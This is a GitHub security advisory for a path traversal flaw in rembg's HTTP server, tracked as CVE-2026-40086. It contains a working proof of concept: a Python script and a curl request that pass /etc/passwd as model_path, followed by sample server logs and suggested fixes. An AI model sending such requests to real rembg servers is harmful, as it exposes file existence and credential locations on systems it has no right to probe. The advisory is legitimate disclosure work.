# [M] Rembg has a Path Traversal via Custom Model Loading

## Summary
Severity: Medium
Advisory: GHSA-3wqj-33cg-xc48
CVE: CVE-2026-40086
CWE: CWE-22, CWE-73
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-3wqj-33cg-xc48
Type: github-advisory

## Affected
- PyPI: `rembg` — affected >=0 <2.0.75

## Details
## Summary

A **path traversal vulnerability** in the rembg HTTP server allows unauthenticated remote attackers to read arbitrary files from the server's filesystem. By sending a crafted request with a malicious `model_path` parameter, an attacker can force the server to attempt loading any file as an ONNX model, revealing file existence, permissions, and potentially file contents through error messages.

**CWE IDs:** CWE-22 (Path Traversal), CWE-73 (External Control of File Name or Path)

---

## Details

### Vulnerable Code Flow

The vulnerability exists in how the HTTP server handles the `extras` JSON parameter for custom model types (`u2net_custom`, `dis_custom`, `ben_custom`).

**1. Entry Point** - [`rembg/commands/s_command.py`](https://github.com/danielgatis/rembg/blob/main/rembg/commands/s_command.py#L191-L202)

```python
def im_without_bg(content: bytes, commons: CommonQueryParams) -> Response:
    kwargs = {}
    if commons.extras:
        try:
            kwargs.update(json.loads(commons.extras))  # ❌ No validation
        except Exception:
            pass
    # ...
    session = new_session(commons.model, **kwargs)  # Passes arbitrary kwargs
```

The `extras` parameter is parsed as JSON and passed directly to `new_session()` without any validation.

**2. Path Handling** - [`rembg/sessions/u2net_custom.py`](https://github.com/danielgatis/rembg/blob/main/rembg/sessions/u2net_custom.py#L79-L83)

```python
@classmethod
def download_models(cls, *args, **kwargs):
    model_path = kwargs.get("model_path")
    if model_path is None:
        raise ValueError("model_path is required")
    return os.path.abspath(os.path.expanduser(model_path))  # ❌ No path validation
```

The `model_path` is returned with tilde expansion but no validation against path traversal.

**3. File Read** - [`rembg/sessions/base.py`](https://github.com/danielgatis/rembg/blob/main/rembg/sessions/base.py#L34-L38)

```python
self.inner_session = ort.InferenceSession(
    str(self.__class__.download_models(*args, **kwargs)),  # Reads file
    # ...
)
```

The path is passed to `onnxruntime.InferenceSession()` which attempts to read and parse the file.

### Root Cause

The custom model feature was designed for **CLI usage** where users already have local filesystem access. However, this feature is also exposed via the **HTTP API** without any restrictions, creating a security boundary violation.

---

## PoC

### Prerequisites

- Python 3.10+
- rembg installed with CLI support: `pip install "rembg[cpu,cli]"`

### Step 1: Start the Vulnerable Server

Open a terminal and run:

```bash
rembg s --host 0.0.0.0 --port 7000
```

You should see output like:
```
To access the API documentation, go to http://localhost:7000/api
To access the UI, go to http://localhost:7000
```

### Step 2: Send the Exploit Request

Open a **second terminal** and run this Python script:

```python
import requests
import json
import urllib.parse
from io import BytesIO

# Minimal valid 1x1 PNG image (required for the request)
MINIMAL_PNG = bytes([
    0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
    0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
    0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
    0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
    0xDE, 0x00, 0x00, 0x00, 0x0C, 0x49, 0x44, 0x41,
    0x54, 0x08, 0xD7, 0x63, 0xF8, 0xFF, 0xFF, 0x3F,
    0x00, 0x05, 0xFE, 0x02, 0xFE, 0xDC, 0xCC, 0x59,
    0xE7, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E,
    0x44, 0xAE, 0x42, 0x60, 0x82
])

# Target paths to test
test_paths = [
    "/etc/passwd",           # System file (should exist)
    "/nonexistent/file.txt", # Non-existent file
]

for path in test_paths:
    print(f"\n[*] Testing path: {path}")
    
    # Build request - extras must be in URL query string
    extras = json.dumps({"model_path": path})
    url = f"http://localhost:7000/api/remove?extras={urllib.parse.quote(extras)}"
    
    response = requests.post(
        url,
        files={"file": ("test.png", BytesIO(MINIMAL_PNG), "image/png")},
        data={"model": "u2net_custom"},
        timeout=30
    )
    
    print(f"    Status: {response.status_code}")
    print(f"    Response: {response.text[:100]}")
```

Or use **curl** directly:

```bash
# Create a minimal PNG file
python3 -c "import sys; sys.stdout.buffer.write(bytes([0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,0x00,0x00,0x00,0x0D,0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x08,0x02,0x00,0x00,0x00,0x90,0x77,0x53,0xDE,0x00,0x00,0x00,0x0C,0x49,0x44,0x41,0x54,0x08,0xD7,0x63,0xF8,0xFF,0xFF,0x3F,0x00,0x05,0xFE,0x02,0xFE,0xDC,0xCC,0x59,0xE7,0x00,0x00,0x00,0x00,0x49,0x45,0x4E,0x44,0xAE,0x42,0x60,0x82]))" > /tmp/test.png

# Send exploit request targeting /etc/passwd
curl -X POST 'http://localhost:7000/api/remove?extras=%7B%22model_path%22%3A%22%2Fetc%2Fpasswd%22%7D' \
  -F "model=u2net_custom" \
  -F "file=@/tmp/test.png"
```

### Step 3: Verify in Server Logs

Go back to the **first terminal** where the server is running. You will see error messages like:

```
onnxruntime.capi.onnxruntime_pybind11_state.InvalidProtobuf: 
[ONNXRuntimeError] : 7 : INVALID_PROTOBUF : Load model from /etc/passwd failed:Protobuf parsing failed.
```

```
onnxruntime.capi.onnxruntime_pybind11_state.NoSuchFile: 
[ONNXRuntimeError] : 3 : NO_SUCHFILE : Load model from /nonexistent/file.txt failed. File doesn't exist
```

### Understanding the Results

| Server Log Message | What It Proves |
|-------------------|----------------|
| `Load model from /etc/passwd failed:Protobuf parsing failed` | ✅ File **exists and was read** by onnxruntime |
| `Load model from /etc/shadow failed:Permission denied` | ✅ File **exists** but process lacks permission |
| `Load model from /nonexistent/... failed. File doesn't exist` | ✅ File **does not exist** - enables enumeration |

**The key proof:** The message `"Load model from /etc/passwd failed:Protobuf parsing failed"` proves that:
1. The attacker-controlled path was passed through without validation
2. `onnxruntime.InferenceSession()` attempted to **read the file contents**
3. The file was read but rejected because `/etc/passwd` is not a valid ONNX protobuf

---

## Impact

### Who is Affected?

- **All users** running `rembg s` (HTTP server mode)
- **Cloud deployments** where rembg is exposed as an API service
- **Docker containers** running rembg server

### Attack Scenarios

1. **Information Disclosure**: Attacker enumerates sensitive files (`/etc/passwd`, `.env`, config files)
2. **Credential Discovery**: Attacker checks for common credential files
3. **Infrastructure Mapping**: Attacker discovers installed software and system configuration
4. **Denial of Service**: Attacker attempts to load very large files, exhausting memory

### What is NOT Affected?

- CLI usage (`rembg i`, `rembg p`) - users already have local file access
- Library usage - developers control the input

---

## Recommended Fix

### Option 1: Disable Custom Models for HTTP API (Recommended)

Remove custom model types from the HTTP API session list:

```python
# In s_command.py, filter out custom models
ALLOWED_HTTP_MODELS = [
    name for name in sessions_names 
    if not name.endswith('_custom')
]

# Use ALLOWED_HTTP_MODELS in the model parameter regex
model: str = Query(
    regex=r"(" + "|".join(ALLOWED_HTTP_MODELS) + ")",
    default="u2net",
)
```

### Option 2: Validate model_path Against Allowlist

If custom models must be supported via HTTP:

```python
import os

ALLOWED_MODEL_DIRS = [
    os.path.expanduser("~/.u2net"),
    "/app/models",  # or your designated model directory
]

def validate_model_path(path: str) -> str:
    """Validate model path is within allowed directories."""
    abs_path = os.path.abspath(os.path.expanduser(path))
    
    for allowed_dir in ALLOWED_MODEL_DIRS:
        allowed_abs = os.path.abspath(allowed_dir)
        if abs_path.startswith(allowed_abs + os.sep):
            return abs_path
    
    raise ValueError(f"model_path must be within allowed directories")
```

### Option 3: Document Security Considerations

At minimum, add security warnings to the documentation:

```markdown
⚠️ **Security Warning**: When running `rembg s` in production:
- Do NOT expose the server directly to the internet
- Use a reverse proxy with authentication
- Consider disabling custom model support
```

---

## References

- **CWE-22**: [Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- **CWE-73**: [External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
- **OWASP Path Traversal**: [Path Traversal Attack](https://owasp.org/www-community/attacks/Path_Traversal)

---

## References
- https://github.com/danielgatis/rembg/security/advisories/GHSA-3wqj-33cg-xc48
- https://nvd.nist.gov/vuln/detail/CVE-2026-40086
- https://github.com/danielgatis/rembg/commit/7c76d3cdc5757ffbda6a76664b24cfbecdb80273
- https://github.com/danielgatis/rembg
- https://github.com/danielgatis/rembg/releases/tag/v2.0.75
